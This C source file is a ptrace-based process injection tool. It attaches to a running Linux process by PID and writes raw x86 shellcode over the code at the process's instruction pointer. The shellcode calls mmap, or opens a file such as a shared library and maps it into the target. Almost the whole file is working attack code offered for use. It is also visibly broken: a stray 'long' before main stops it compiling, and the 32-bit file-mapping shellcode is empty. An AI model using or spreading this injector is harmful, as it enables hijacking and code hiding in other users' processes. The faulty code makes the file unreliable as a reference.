
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/reg.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/stat.h>

typedef struct ret {
  unsigned long addr;
  unsigned long  size;
} ret_t;

typedef enum {
  UNKNOWN = 0,
  BITS32 = 32,
  BITS64 = 64
} bit_type;


void die(char *str) { perror(str);exit(1);}


ret_t * get_free_address(pid_t pid)
{
  char path[20];
  char tmpline[256];

  unsigned long pend;
  unsigned long beg =0, end=0;
  ret_t * ret = NULL;

  char *ptr = NULL , *ptr2 = NULL;

  FILE *fd;

  snprintf(path,sizeof path,"/proc/%d/maps",pid);
  if((fd=fopen(path,"r")) == NULL)
    die("open() ");


  while(!feof(fd)) {

    if((fgets(tmpline,sizeof tmpline,fd)) == NULL)
      die("read() ");

    //    printf("%s\n",tmpline);
    if ((ptr=strchr(tmpline,'-')) == NULL)
      die("strchr()");

    /* if ((ptr2=strchr(tmpline,'-')) == NULL) */
    /*   die("strchr()"); */

    pend = end;

    beg  = strtol(tmpline,NULL,16);
    end  = strtol(ptr+1,NULL,16);

    //    printf("%x - %x\n",beg,end);
    if( beg && pend && pend != beg ) {
      ret = calloc(1,sizeof(ret_t));
      ret->addr = pend;
      ret->size = (beg - pend -1) & 0x0fffffff;
      break;

    }
  }
  fclose(fd);
  return ret;
}

bit_type get_type(pid_t pid) {
  char path[20];
  char e_ident[16];
  int fd;
  char ret=UNKNOWN;
  int class;
  snprintf(path,sizeof path,"/proc/%d/exe",pid);
  if((fd=open(path,0,0)) < 0)
    die("open() ");
  if(read(fd,e_ident,sizeof e_ident)<0)
    die("read() ");

  close(fd);

  switch (e_ident[4]) {
     case 0 : return UNKNOWN;
     case 1 : return BITS32;
     case 2 : return BITS64;
     default:  return UNKNOWN;
  }
}

/* XXX: no 64 -> 32 bit processes :( */
long inject_scode(pid_t pid,char *sc,size_t size,bit_type type,int int_count) {

  int status;
  int SPTR = (sizeof(void*));
  long *ptr,*ret,*pc;
  size_t bsize;
  char * buff;
  int i = 0;

  struct user_regs_struct old_regs;
  struct user_regs_struct regs;

#if  __WORDSIZE == 64
  if(type == BITS64){
    SPTR = 8;
    ret = &regs.rax;
    pc = &old_regs.rip;
  }
#else
  if (type == BITS32){
    SPTR = 4;
    pc = &old_regs.eip;
    ret = &regs.eax;
  }
#endif
  else { die("UNKOWN BIT SIZE"); }

  bsize = size % SPTR == 0 ? size : (size/SPTR+1)*SPTR;
  buff  = malloc(bsize);

  if (ptrace(PTRACE_ATTACH,pid,NULL,NULL) < 0)
    die("ptrace(ATTACH)");

  waitpid(pid, &status, 0);

  printf("[*] saving registers\n");
  if (ptrace(PTRACE_GETREGS,pid,NULL,&old_regs)<0)
    die("ptrace(SAVEREGS)");

  // make place for shellcode...
  printf("[*] making place for shellcode\n");

  ptr = (long*) buff;
  for(i=0;i<bsize;i+=SPTR){
    *ptr = ptrace(PTRACE_PEEKTEXT,pid,*pc+i,NULL);
    ptr++;
  }

  ptr = (long *) sc;
  printf("[+] Copy shellcode... ");
  //copy shellcode
  for(i=0;i<bsize;i+=SPTR)
    if(ptrace(PTRACE_POKETEXT,pid,*pc+i,*ptr++) < 0)
      die("ptrace(POKE_SCODE)");
  printf("done.\n");
  fflush(stdout);
  printf("[+] Executing... ");

  // we will switch to debugger after each syscall
  while(int_count--) {
    if (ptrace(PTRACE_CONT,pid,NULL,NULL) < 0)
      die("ptrace(CONT)") ;

    waitpid(pid,&status,0);
    if(WSTOPSIG(status)  != SIGTRAP)
      die("uncool somthing interupted..");


    if (ptrace(PTRACE_GETREGS,pid,NULL,&regs)<0)
      die("ptrace(SAVEREGS)");

    if(*ret < 0) {
      printf("Sth wrong going down..\n");
      break;
    }
  }
  printf(" done\n");
  // restore code
  ptr = (long *) buff;
  for(i=0;i<bsize;i+=SPTR)
    if ( ptrace(PTRACE_POKETEXT,pid,*pc+i,*ptr++) <0)
      die("ptrace(RESOTRE)");

  // set rip and regs back
  if (ptrace(PTRACE_SETREGS,pid,NULL,&old_regs)<0)
    die("ptrace(RESOTRE_REGS)");

  if(ptrace(PTRACE_DETACH,pid,NULL,NULL))
    die("ptrace(DETACH)");

  free(buff);
  return *ret;
}

long ptrace_mmap(pid_t pid)
{
  long *ptr;
  ret_t * x;
  char sc64[] =
    "\x48\xbe\x43\x43\x43\x43\x43\x43\x43\x43"
    "\x48\xbf\x42\x42\x42\x42\x42\x42\x42\x42"
    "\x4d\x31\xc9"
    "\x4d\x31\xc0"
    "\xba\x07\x00\x00\x00"
    "\xb9\x32\x00\x00\x00"
    "\xb8\x09\x00\x00\x00"
    "\x49\x89\xca"
    "\x0f\x05"
    "\xcc";

  char sc32[] =
    "\x31\xed"
    "\x31\xff"
    "\xbe\x32\x00\x00\x00"
    "\xba\x07\x00\x00\x00"
    "\xc1\xed\x0c"
    "\xb9\x43\x43\x43\x43"
    "\xbb\x42\x42\x42\x42"
    "\xb8\xc0\x00\x00\x00"
    "\xcd\x80"
    "\xcc";

  bit_type type =get_type(pid);
  char *sc =  type == BITS32 ? sc32 : sc64;
  size_t scsize = type == BITS32 ? sizeof sc32 : sizeof sc64;

  x = get_free_address(pid);
  if (!x) die("get_free_address() ");

  printf("[+] Found nice niche @ %lx (size %lx)\n",x->addr,x->size);
  printf("[+] Attemt to inject mmap shellcode (size: %lu)\n",scsize);

  // replace dummies with real value
  ptr = (long*)memchr(sc,0x43,scsize);
  *ptr = x->size;
  ptr = (long *) memchr(sc,0x42,scsize);
  *ptr = x->addr;

  /** inject shellcode for mapping **/

  /*  64bit                       32bit
     mov rsi, x->size      |  xor ebp, ebp
     xor r9,r9             |  xor edi, edi
     xor r8,r8             |  mov esi, 0x32
     mov edx,0x7           |  mov edx, 0x7
     mov ecx,0x32          |  mov ecx, x->size
     mov rdi, x->addr      |  mov ebx, x->addr
     mov r10,rcx           |  shr ebp, 0xc
     mov eax,0x09          |  mov eax, 0xc0
     syscall               |  int 80h | call gs:0x10
  */
  free(x);
  return inject_scode(pid,sc,scsize,type,1);
}


long ptrace_mmapfd(pid_t pid,char *path)
{
  size_t size;
  struct stat sb;
  long *ptr,ret;

  char sc64[] =
    "\xe8\x37\x00\x00\x00"
    "\x5f"
    "\x48\x31\xd2"
    "\x48\x31\xf6"
    "\xb8\x02\x00\x00\x00"
    "\x0f\x05"
    "\xcc"
    "\x49\x89\xc0"
    "\x48\xbe\x41\x41\x41\x41\x41\x41\x41\x00"
    "\x4d\x31\xc9"
    "\x48\x31\xff"
    "\xba\x05\x00\x00\x00"
    "\xb9\x02\x00\x00\x00"
    "\x49\x89\xca"
    "\xb8\x09\x00\x00\x00"
    "\x0f\x05"
    "\xcc"
    "\xeb\xc7";

  char sc32[] = "";

  char *sce;
  bit_type type =get_type(pid);
  char *sc =  type == BITS32 ? sc32 : sc64;
  size_t scsize = type == BITS32 ? sizeof sc32 : sizeof sc64;


  int fd = open(path,0,0);
  fstat(fd,&sb);
  //  close(fd);
  printf("[*] Prepering shellcode for mmaping %s (size: %lu)\n",path,sb.st_size);
  printf("[*] Attemt to inject read_mmap shellcode (size: %lu)\n",scsize);

  mmap(NULL,sb.st_size,PROT_READ|PROT_EXEC,MAP_PRIVATE,fd,0);

  // replace dumy
  ptr  = (long*) memchr(sc,0x41,scsize);
  *ptr = (long) sb.st_size;

  sce = malloc(scsize + strlen(path) + 1);
  memcpy(sce,sc,scsize);
  memcpy(sce+scsize-1,path,strlen(path));
  sce[scsize+strlen(path)] = '\x00';


  /** inject shellcode for mapping **/

  /*  64bit            32bit
                  call end
                  begin:   |
     pop rdi ; file_path
     xor rdx,rdx
     xor rsi,rsi
     mov eax,0x2
     syscall
                  int3

     mov r8, rax
     mov rsi, size         |  xor ebp, ebp
     xor rdi,rdi           |  xor edi, edi
     xor r9,r9             |  mov esi, 0x2
     mov edx,0x7           |  mov edx, 0x7
     mov ecx,0x2           |  mov ecx, x->size
     mov r10,rcx           |  mov ebx, x->addr
     mov eax,0x09          |  mov eax, 0xc0
     syscall               |  int 80h | call gs:0x10
                  int3
		  jmp begin
		  /path/to/library.so\x00
  */
  ret = inject_scode(pid,sce,scsize,type,2);
  free(sce);
  return ret;

}


long

int main(int argc,char **argv)
{
  pid_t pid;
  if (argc < 3) die("argv");
  pid = atoi(argv[1]);
  pid = pid == 0 ? getpid() : pid ;
  //printf("[+] mapped new area @ %lx\n",ptrace_mmap(pid));
  printf("[+] mapped new file @ %lx\n",ptrace_mmapfd(pid,argv[2]));
}
